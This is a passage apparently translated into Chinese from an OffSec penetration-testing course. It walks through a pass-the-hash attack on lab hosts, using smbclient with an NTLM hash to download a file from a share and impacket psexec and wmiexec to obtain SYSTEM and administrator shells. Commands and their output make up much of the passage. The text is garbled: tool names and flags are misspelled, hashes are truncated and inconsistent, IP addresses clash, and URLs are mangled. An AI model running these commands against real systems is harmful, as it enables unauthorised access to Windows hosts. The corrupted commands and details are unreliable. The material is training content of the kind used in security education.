
列表 296 - 启用 SeDebugPrivilege，检索 SYSTEM 用户权限并提取 NTLM 哈希

列表 296 显示了 NTLM 哈希提取的输出。我们将在稍后使用 Administrator NTLM 哈希。

为了利用哈希传递 `PTH`，我们需要支持使用 NTLM 哈希进行验证的工具。遗憾的是，我们有很多工具可以选择。让我们回顾不同情况下的几个示例。对于 SMB 穷举和管理，我们可以使用 `smclient^61` 或 `CrackMapExec^62`。对于命令执行，我们可以使用来自 `packet^63` 库的脚本，如 `psexec.py64` 和 `wmiex.py65`。如果用户有权限，我们不仅可以使用 NTLM 哈希通过 SMB 连接到系统，还可以通过 RDP 和 WinRM^66 等其他协议进行连接。我们还可以使用 Mimikatz 进行哈希传递。

由于本次演示的首要目标是通过提供 NTLM 哈希来访问 SMB 共享，我们将使用 `smclient`。要使用该命令，我们需要通过转义斜杠输入共享路径作为第一个参数。我们将输入 `\\192.168.50.212\secrets`。我们将使用 `-U` 设置用户并使用 `-pw-nt-hash` 指定哈希。使用 `smclient` 成功连接到 `secrets` 共享后，我们可以使用 `dir` 列出共享的所有文件。我们可以使用 `get` 命令将文件下载到我们的 Kali 机器。

```
kali@kali:# smclient \\192.168.50.212\secrets -U Administrator -pw-nt-hash 7a38310ea6f027ee955abed172964b

smb: \> dir

Try "help" 获取可能的命令列表。

D 0 Jun 16:55:37

D 0 Jun 16:55:35

A 4 Jun 11:34:47

secrets.txt
```

+ 661 (Samba, 2022), https://www.samba.org/s/docs/man-html/smclient
662 (Github, 2022), https://github.com/by33dr/CrackMapExec
663 (Github, 2022), https://github.com/SecureAuthCorp/impacket
664 (Github, 2022), https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
665 (Github, 2021), https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiex.py
666 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/32/winportal
# OffSec

45239 blocks of size 4096. 77163 blocks available
smb: \ get secrets.txt
getting file | secrets.txt of size 4 (0.0 KiloBytes/sec)

列表 297 - 使用 NTLM 哈希 smclient

通过提供 NTLM 哈希而不是密码成功连接到 SMB 共享。目录列表显示 `secrets.txt`。下载文件后我们可以查看其内容。

在演示的第一部分，我们使用 NTLM 哈希访问 SMB 共享。在第二部分，我们的目标是获取交互式 shell。我们可以使用多种工具，但我们将使用 `impacket` 库中的 `psexec.py` 脚本。该脚本与原始的 Sysinternals `PsExec` 命令相似。预期结果是获取交互式 shell 或代码执行。要执行 `psexec`，我们需要使用两个参数。第一个参数是 `hashes`，允许我们使用 NTLM 哈希对目标进行验证。格式为 "LMHash:NTLMHash"，我们在 LMHash 部分填充了 32。在命令末尾，我们可以指定另一个参数 "username@ip"，以确定在目标上执行哪个 `psexec`。如果我们留空，将执行 `cmd.exe`，为我们提供交互式 shell。

```
kali@kali~$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f027ee955abed172964b Administrator@v0.0
```

* 正在请求 192.168.5.212 的共享...
* 发现可写共享 ADMIN$
* 上传文件 vnanel.exe
* 正在打开 192.168.5.212  SVC...
* 在 192.168.5.212 上创建服务 HML...
* 正在启动服务 HML...
* 输入 help 获取额外的 shell

Microsoft Windows [Version 10.0.20348.707]
(C) Microsoft Corporation. All rights reserved.

```
C:\Windows\system32> hostname

C:\Windows\system32> ipconfig
```

667 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/internals/psexec
668 (Kali Tools, 2022), https://www.kali.com/tools/impacket-scripts

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

# OffSec

使用 Kali Linux 进行渗透测试

# Windows IP 配置

以太网适配器 Ethernet0:

| 连接特定后缀 | : |
| :--- | :--- |
| 本地 IPv6 地址 | fe80::7992:61cd:da49:9046 |
| IPv4 地址 | 192.168.50.212 |
| 子网掩码 | 255.255.255.0 |
| 默认网关 | 192.168.50.254 |

```
C:\Windows\system32> whoami

authority\system

C:\Windows\system32> exit
```

```
kali@kali:-$
```

列表 299 - 使用 psexec 获取交互式 shell

我们成功在 FILES02 上获取了交互式 shell。由于 `psexec.py` 的性质，我们将始终获得 SYSTEM 权限的 shell，而不是验证用户的权限。

可以使用其他脚本（如 `impacket-wmiexec`）获取作为验证用户的 shell。在 Kali 上，我们将使用与 `impacket-psexec` 相同的参数运行 `impacket-wmiexec`。

```
kali@kali:-$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea66f007ee955abed1762964 Administrator@192.168.50.212
```

Impacket v0.94 - Copyright 2021 SecureAuth Corporation

+ [* 使用 SMB.18 版本
[1] 启动半交互式 shell - 请小心执行
[!] 输入 help 获取额外的 shell 命令

```
C:\whoami

files02>administrator
```

```
C:\>
```
